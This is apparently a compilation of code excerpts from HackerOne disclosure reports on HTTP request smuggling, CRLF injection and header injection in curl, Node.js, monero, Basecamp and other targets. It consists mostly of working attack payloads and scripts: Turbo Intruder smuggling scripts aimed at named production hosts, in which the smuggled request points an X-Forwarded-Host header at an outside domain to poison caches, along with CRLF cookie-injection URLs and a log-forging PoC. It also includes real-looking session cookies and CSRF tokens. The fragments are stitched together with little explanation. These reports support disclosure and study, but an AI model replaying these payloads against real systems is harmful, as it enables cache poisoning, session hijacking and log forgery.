===========================================

--- CURLOPT_ISSUERCERT ---
  Setting: "fake_issuer.pem"
  setopt: No error
  perform: Issuer check against peer certificate failed
  Result: CORRECT - issuer check enforced

--- CURLOPT_SSL_EC_CURVES ---
  Setting: "INVALID_CURVE_NAME"
  setopt: No error
  perform: Could not use specified SSL cipher
  Result: CORRECT - EC curve validated

--- CURLOPT_CRLFILE ---
  Setting: "fake_crl.pem"
  setopt: No error
  perform: Failed to load CRL file (path? access rights?, format?)
  Result: CORRECT - CRL check enforced

=====================
```

```
case CURLOPT_ISSUERCERT:
  if(!Curl_ssl_supports(data, SSLSUPP_ISSUERCERT))
    return CURLE_NOT_BUILT_IN;
  return Curl_setstropt(&data->set.str[STRING_SSL_ISSUERCERT], va_arg(param, char *));
```

```
                                                                                                                                                                                            
```

## #3623064 HTTP/1.1 Response Desynchronization via conflicting CL/TE headers in Proxy CONNECT — curl — - — HTTP Request Smuggling
Source: `hackerone/reports/2026/3623064.md` (https://hackerone.com/reports/3623064)

```
./build/src/curl -V
curl 8.19.1-DEV (Darwin) libcurl/8.19.1-DEV OpenSSL/3.6.1 zlib/1.2.12 brotli/1.2.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.5 nghttp2/1.68.0 OpenLDAP/2.4.28/Apple
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt mqtts pop3 pop3s rtsp smb smbs smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS brotli HSTS HTTP2 HTTPS-proxy IDN IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP UnixSockets zstd
```

```
./build/src/curl -v -x http://127.0.0.1:9999 --proxy-user user:pass --proxy-digest https://example.com

*   Trying 127.0.0.1:9999...
* CONNECT: no ALPN negotiated
* allocate connect buffer
* Proxy auth using Digest with user 'user'
* Establish HTTP proxy tunnel to example.com:443
> CONNECT example.com:443 HTTP/1.1
> Host: example.com:443
> User-Agent: curl/8.19.1-DEV
> Proxy-Connection: Keep-Alive
>
< HTTP/1.1 407 Proxy Authentication Required
< Proxy-Authenticate: Digest realm="test", nonce="abc123", qop="auth"
< Content-Length: 5
< Transfer-Encoding: chunked
* CONNECT responded chunked
<
* Ignore 5 bytes of response-body
* Proxy auth using Digest with user 'user'
* Establish HTTP proxy tunnel to example.com:443
> CONNECT example.com:443 HTTP/1.1
> Host: example.com:443
> Proxy-Authorization: Digest username="user", realm="test", nonce="abc123", uri="example.com:443", cnonce="Q9bDz1eQ+MAmeNi2", nc=00000001, qop=auth, response="df6fbefe412a23d6edddc1f42109537f"
> User-Agent: curl/8.19.1-DEV
> Proxy-Connection: Keep-Alive
>
< THIS-SHOULD-BE-IGNORED
< 0
* Invalid response header
* closing connection #0
curl: (43) Invalid response header
```

## #3648681 Improper Input Validation — HTTP Response Parser Unconditionally Accepts Bare CR in Status Line — nodejs — - — HTTP Request Smuggling
Source: `hackerone/reports/2026/3648681.md` (https://hackerone.com/reports/3648681)

```
const http = require('http');
const net = require('net');

const server = net.createServer((sock) => {
  // Response with bare CR (\r\r) as status line terminator instead of \r\n
  const payload = 'HTTP/1.1 200 OK\r\rContent-Length: 4\r\n\r\nEvil';
  sock.write(payload);
  setTimeout(() => sock.end(), 300);
});

server.listen(19999, () => {
  const req = http.request({
    hostname: '127.0.0.1',
    port: 19999,
    path: '/',
    method: 'GET',
    insecureHTTPParser: false  // strict mode (default)
  }, (res) => {
    let body = '';
    res.on('data', (c) => body += c);
    res.on('end', () => {
      console.log('Status:', res.statusCode);         // 200
      console.log('Headers:', JSON.stringify(res.headers)); // {"content-length":"4"}
      console.log('Body:', body);                       // Evil
      server.close();
    });
  });
  req.on('error', (e) => console.log('Error:', e.message));
  req.end();
});
```

```
Status: 200
Headers: {"content-length":"4"}
Body: Evil
```

```
const http = require('http');
const net = require('net');

const server = http.createServer((req, res) => res.end('OK'));
server.listen(19998, () => {
  const sock = net.createConnection({ host: '127.0.0.1', port: 19998 }, () => {
    sock.write('GET / HTTP/1.1\r\rHost: localhost\r\n\r\n');
  });
  sock.on('data', (d) => {
    console.log(d.toString().split('\r\n')[0]);
    // Output: HTTP/1.1 400 Bad Request
    server.close();
    sock.destroy();
  });
});
```

## #3621606 ZMQ RPC Log Injection and Untrusted Payload Persistence — monero — - — CRLF Injection
Source: `hackerone/reports/2026/3621606.md` (https://hackerone.com/reports/3621606)

```
   python poc_zmq_log_injection.py --target 127.0.0.1:18082
   
```

```
#!/usr/bin/env python3
"""
PoC: ZMQ RPC request-body log injection / payload logging in monerod.
Authorized testing only.

Usage:
  python poc_zmq_log_injection.py --target 127.0.0.1:18082
"""

import argparse
import sys

try:
	import zmq
except ImportError:
	print("[!] Missing dependency: pyzmq")
	print("    Install with: pip install pyzmq")
	sys.exit(1)


def main() -> int:
	ap = argparse.ArgumentParser()
	ap.add_argument("--target", required=True, help="host:port of ZMQ RPC, e.g. 127.0.0.1:18082")
	ap.add_argument("--timeout-ms", type=int, default=5000)
	args = ap.parse_args()

	endpoint = f"tcp://{args.target}"

	payload = (
		'{"jsonrpc":"2.0","id":1,"method":"get_info","params":{"note":"ATTACKER_MARKER_BEGIN\\n'
		'FORGED_LOG_LINE: authentication succeeded for admin\\n'
		'ATTACKER_MARKER_END"}}'
	)

	print(f"[*] Connecting to {endpoint}")
	print("[*] Sending crafted payload with newline markers")

	ctx = zmq.Context()
	sock = ctx.socket(zmq.REQ)
	sock.setsockopt(zmq.RCVTIMEO, args.timeout_ms)
	sock.setsockopt(zmq.SNDTIMEO, args.timeout_ms)

	try:
		sock.connect(endpoint)
		sock.send_string(payload)
		reply = sock.recv_string()
		print("[+] Server response received:")
		print(reply)
	except zmq.error.Again:
		print("[!] Timeout waiting for response")
		return 2
	finally:
		sock.close(0)
		ctx.term()

	print("\n[*] Next step: inspect daemon log for ATTACKER_MARKER strings and injected formatting")
	return 0


if __name__ == "__main__":
	sys.exit(main())
```

## #919175 HTTP request smuggling on Basecamp 2 allows web cache poisoning — basecamp — - — HTTP Request Smuggling
Source: `hackerone/reports/2020/919175.md` (https://hackerone.com/reports/919175)

```
POST /4618984/account HTTP/1.1
Host: basecamp.com
Connection: keep-alive
Content-Length: 144
Accept: */*
X-CSRF-Token: BW5Kp3r1hLOuZI6+4GkBW5XUpkt55bi9tIiqgKFo1ZY=
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: _basecamp_session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTAwNzU0OTI3NWZjMTI0Zjk5ZTVlOGE5NTU0MGFhN2UyBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMUJXNUtwM3IxaExPdVpJNis0R2tCVzVYVXBrdDU1Ymk5dElpcWdLRm8xWlk9BjsARkkiDnBlcnNvbl9pZAY7AEZpBHYSEQE%3D--ced0e607b9844aff72e0b9421e73e4d52c8b04bc;identity_id=BAhpBOwxQgE%3D--3a11dbd3096b61294dc6c864b807a87944e4b6ab;
Transfer-Encoding: chunked
Transfer-encoding: identity

22
_method=patch&account%5Bname%5D=BC
0

GET /x HTTP/1.1
X-Forwarded-Host: enjv2g5042bg.x.pipedream.net
X-Forwarded-Proto: http
Foo: bar
```

```
POST /4618984/account HTTP/1.1
Host: basecamp.com
Connection: keep-alive
Content-Length: 144
Accept: */*
X-CSRF-Token: BW5Kp3r1hLOuZI6+4GkBW5XUpkt55bi9tIiqgKFo1ZY=
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: _basecamp_session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTAwNzU0OTI3NWZjMTI0Zjk5ZTVlOGE5NTU0MGFhN2UyBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMUJXNUtwM3IxaExPdVpJNis0R2tCVzVYVXBrdDU1Ymk5dElpcWdLRm8xWlk9BjsARkkiDnBlcnNvbl9pZAY7AEZpBHYSEQE%3D--ced0e607b9844aff72e0b9421e73e4d52c8b04bc;identity_id=BAhpBOwxQgE%3D--3a11dbd3096b61294dc6c864b807a87944e4b6ab;
Transfer-Encoding: chunked
Transfer-encoding: identity

22
```

```
GET /x HTTP/1.1
X-Forwarded-Host: enjv2g5042bg.x.pipedream.net
X-Forwarded-Proto: http
Foo: bar
'''
Make sure to set the target to `https://basecamp.com` and port to `443`.

**3.** Issue the request in repeater.
```

## #867577 Unauthenticated request smuggling on launchpad.37signals.com — basecamp — - — HTTP Request Smuggling
Source: `hackerone/reports/2020/867577.md` (https://hackerone.com/reports/867577)

```
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint='https://launchpad.37signals.com:443',
                           concurrentConnections=3,
                           requestsPerConnection=2,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )

    attack = '''POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 69
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

3
x=1
0

GET / HTTP/1.1
X-Forwarded-Host: hazimaslam.com
Foo: bar'''

    engine.queue(attack)

    victim = '''GET /signin HTTP/1.1
Host: launchpad.37signals.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,la;q=0.8
Cookie: _launchpad_session=uViarUZn10afBS9AD4AgD9lF4iEk6%2FIfinxiAVgiEQNq2xMTKY86i9r%2FZEQ%2BENl183aEL845OspHItodYdrC0OIEWMzEjswGng%2F%2BXwE5nsYBhY7ep%2B%2FmrDB1ZXa%2B1NaAji52own5luVsggkP98GrqNjnWHxGdIfffZjMFwz3Q3fNxV0NilS1DmNiY0P72x9CDsrQfzc0HbGfnL%2BEvs9%2BODfbf
```

```
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint='https://launchpad.37signals.com:443',
                           concurrentConnections=3,
                           requestsPerConnection=2,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )

    attack = '''POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 903
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

3
x=1
0

POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 435
X-Forwarded-Proto: https
Content-Type: application/x-www-form-urlencoded
Cookie: identity_id=PASTE_identity_id_HERE; session_token=PASTE_session_token_HERE; _launchpad_session=PASTE_launchpad_session_HERE

_method=patch&authenticity_token=PASTE_authenticity_token_HERE&identity%5bavatar%5d=&identity%5bname%5d='''

    engine.queue(attack)

    victim = '''GET /signin HTTP/1.1
Host: launchpad.37signals.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36
Cookie: _launchpad_session=uViarUZn10afBS9AD4AgD9lF4iEk6%2FIfinxiAVgiEQNq2xMTKY86i9r%2FZEQ%2BENl183aEL845OspHItodYdrC0OIEWMzEjswGng%2F%2BXwE5nsYBhY7ep%2B%2FmrDB1ZXa%2B1NaAji52own5luVsggkP98GrqNjnWHxGdIfffZjMFwz3Q3fNxV0NilS1DmNiY0P72x9CDsrQfzc
```

```
GET / HTTP/1.1
X-Forwarded-Host: hazimaslam.com
Foo: bar'''

    engine.queue(attack)
```

## #4025056 HTTP/1.1 response framing violation and unsafe connection reuse when transfer decoding is disabled — curl — - — HTTP Request Smuggling
Source: `hackerone/reports/2026/4025056.md` (https://hackerone.com/reports/4025056)

```
Tag: curl-8_22_0
Commit: 01346829096c61b372692f6dc43ffa778c6caccd
Platform: macOS ARM64
Build: Debug shared libcurl with AddressSanitizer and UndefinedBehaviorSanitizer
```

```
@rpath/libcurl-d.4.dylib
```

```
curl 8.0.1: not affected by this test
curl 8.1.0: affected
curl 8.22.0: affected
```

## #526880 Request smuggling on ████████ — deptofdefense — - — HTTP Request Smuggling
Source: `hackerone/reports/2019/526880.md` (https://hackerone.com/reports/526880)

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='https://██████████:443',
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False,
                           maxRetriesPerRequest=0
                           )
    engine.start()    

    attack = '''POST /████ HTTP/1.1
Fooz: bar\nTransfer-Encoding: chunked
Host: stage.█████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Foo: bar

0

GET███████ HTTP/1.1
X: X'''

    engine.queue(attack)

    victim = '''GET /foo.jpg?x=%s HTTP/1.1
Host: stage.████████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: keep-alive

'''
    for i in range(15):
        engine.queue(victim, i)
        time.sleep(0.2)


def handleResponse(req, interesting):
    table.add(req)

 
```

```
stage.████████.		59	IN	A	██████████
stage.████.		59	IN	A	████████
stage.█████.		59	IN	A	██████
stage.███████.		59	IN	A	█████
stage.████.		59	IN	A	██████████
stage.██████████.		59	IN	A	█████
```

```
    engine = RequestEngine(endpoint='https://██████████:443',
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False,
                           maxRetriesPerRequest=0
                           )
    engine.start()    
```

## #237357 CRLF Injection at vpn.bitstrips.com — snapchat — - — CRLF Injection
Source: `hackerone/reports/2017/237357.md` (https://hackerone.com/reports/237357)

```
https://vpn.bitstrips.com/__session_start__/%0aSet-Cookie:malicious_cookie1

Host: vpn.bitstrips.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/plain, */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
X-OpenVPN: 1
X-CWS-Proto-Ver: 2
Referer: https://vpn.bitstrips.com/?src=connect
Content-Length: 29
Cookie: openvpn_sess_73209e0b8ad597c3861a05a79e873389=e769bd6ab9896e586227df60f33836f0
Connection: keep-alive
```

```
HTTP/1.1 302 Found
Transfer-Encoding: chunked
Date: Tue, 06 Jun 2017 20:00:36 GMT
Content-Type: text/html; charset=UTF-8
Location: https://vpn.bitstrips.com/
Set-Cookie: malicious_cookie1
Server: OpenVPN-AS
```

## #3479203 HTTP/3 Protocol Smuggling and Header Injection via CRLF in QPACK value conversion — curl — - — CRLF Injection
Source: `hackerone/reports/2025/3479203.md` (https://hackerone.com/reports/3479203)

```
    1 /* curl_ngtcp2.c around line 1780 */
    2 /* store as an HTTP1-style header */
    3 curlx_dyn_reset(&ctx->scratch);
    4 result = curlx_dyn_addn(&ctx->scratch, (const char *)h3name.base, h3name.len);
    5 if(!result)
    6   result = curlx_dyn_addn(&ctx->scratch, STRCONST(": "));
    7 if(!result)
    8   /* VULNERABILITY: h3val.base contains raw bytes from the network.
    9      If it contains \r\n, they are appended directly. */
```

```
    1 diff --git a/lib/vquic/curl_ngtcp2.c b/lib/vquic/curl_ngtcp2.c
    2 index XXXXXXX..XXXXXXX 100644
    3 --- a/lib/vquic/curl_ngtcp2.c
    4 +++ b/lib/vquic/curl_ngtcp2.c
    5 @@ -1780,6 +1780,16 @@ static int cb_h3_recv_header(nghttp3_conn *conn, int64_t stream_id,
    6      result = curlx_dyn_addn(&ctx->scratch, STRCONST(": "));
    7      if(!result)
    8        result = curlx_dyn_addn(&ctx->scratch,
    9                                (const char *)h3val.base, h3val.len);
```

```
      browser/client behind it processes the injected malicious header.
```

## #3249936 HTTP Request Smuggling Vulnerability Analysis - cURL Security Report — curl — - — HTTP Request Smuggling
Source: `hackerone/reports/2025/3249936.md` (https://hackerone.com/reports/3249936)

```
   curl -v -X POST \
     -H "Transfer-Encoding: chunked" \
     -H "Content-Length: 100" \
     -d "0\r\n\r\nSMUGGLED_PAYLOAD" \
     http://example.com/test
   
```

```
   # Setup a test proxy that interprets Content-Length first
   # Then send the conflicting headers through the proxy
   curl -v --proxy http://test-proxy:8080 \
     -H "Transfer-Encoding: chunked" \
     -H "Content-Length: 50" \
     -X POST \
     -d "0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" \
     http://target.com/public
   
```

```
   import subprocess
   
   def test_smuggling():
       cmd = [
           "curl", "-v", "--include",
           "-H", "Transfer-Encoding: chunked",
           "-H", "Content-Length: 200",
           "-X", "POST",
           "-d", "0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: example.com\r\n\r\n",
           "http://example.com/endpoint"
       ]
       
       result = subprocess.run(cmd, capture_output=True, text=True)
       print("STDOUT:", result.stdout)
       print("STDERR:", result.stderr)
   
   test_smuggling()
   
```

## #217058 CRLF injection in info.hacker.one — security — - — CRLF Injection
Source: `hackerone/reports/2017/217058.md` (https://hackerone.com/reports/217058)

```
GET /%0d%0a%09headername:%20headervalue HTTP/1.1
Host: info.hacker.one
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

Response
```

## #3235428 CRLF injection in libcurl's SMTP client via --mail-from and --mail-rcpt allows SMTP command smuggling — curl — - — CRLF Injection
Source: `hackerone/reports/2025/3235428.md` (https://hackerone.com/reports/3235428)

```
$ curl -V
curl 8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0 OpenSSL/3.0.13 zlib/1.3 brotli/1.1.0 zstd/1.5.5 libidn2/2.3.7 libpsl/0.21.2 (+libidn2/2.3.7) libssh/0.10.6/openssl/zlib nghttp2/1.59.0 librtmp/2.3 OpenLDAP/2.6.7
Release-Date: 2023-12-06, security patched: 8.5.0-2ubuntu10.6
Protocols: dict file ftp ftps gopher gophers http https imap imaps ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp
Features: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM PSL SPNEGO SSL threadsafe TLS-SRP UnixSockets zstd
```

```
$ curl -V
curl 8.15.0-DEV (Linux) libcurl/8.15.0-DEV OpenSSL/3.0.13 zlib/1.3 brotli/1.1.0 zstd/1.5.5 libidn2/2.3.7 libpsl/0.21.2 libssh2/1.11.0 nghttp2/1.59.0 OpenLDAP/2.6.7
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtsp scp sftp smb smbs smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS brotli HSTS HTTP2 HTTPS-proxy IDN IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP UnixSockets zstd
```

```
$ curl -vf --url "smtp://localhost:1025/" --mail-from "attacker@example.com" --mail-rcpt "recipient@example.com" --upload-file mail.txt
* Host localhost:1025 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying 127.0.0.1:1025...
* Connected to localhost (127.0.0.1) port 1025
< 220 test-smtpd Python SMTP 1.4.6
> EHLO mail.txt
< 250-test-smtpd
< 250-SIZE 33554432
< 250-8BITMIME
< 250-SMTPUTF8
< 250 HELP
> MAIL FROM:<attacker@example.com> SIZE=4
< 250 OK
> RCPT TO:<recipient@example.com>
< 250 OK
> DATA
< 354 End data with <CR><LF>.<CR><LF>
} [4 bytes data]
* We are completely uploaded and fine
< 250 Message accepted for delivery
* Connection #0 to host localhost left intact
```

## #3793495 Incomplete Suppression of  Transfer-Encoding: chunked Header in HTTP/2 After Redirect From HTTP/1.1 — curl — - — HTTP Request Smuggling
Source: `hackerone/reports/2026/3793495.md` (https://hackerone.com/reports/3793495)

```
curl -vvv --http1.1 --no-alpn -L --http2 -k \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Type: text/plain" \
  -d "This is chunked encoding bug test data" \
  http://test.local:8080/
```

## #3481849 HTTP/2 and HTTP/3 Header Injection in curl — curl — - — HTTP Response Splitting
Source: `hackerone/reports/2025/3481849.md` (https://hackerone.com/reports/3481849)

```
     result = curlx_dyn_addn(&ctx->scratch, STRCONST(": "));
```

```
     result = curlx_dyn_addn(&ctx->scratch, (const char *)value, valuelen);  // UNVALIDATED
```

```
     result = curlx_dyn_addn(&ctx->scratch, STRCONST("\r\n"));
```

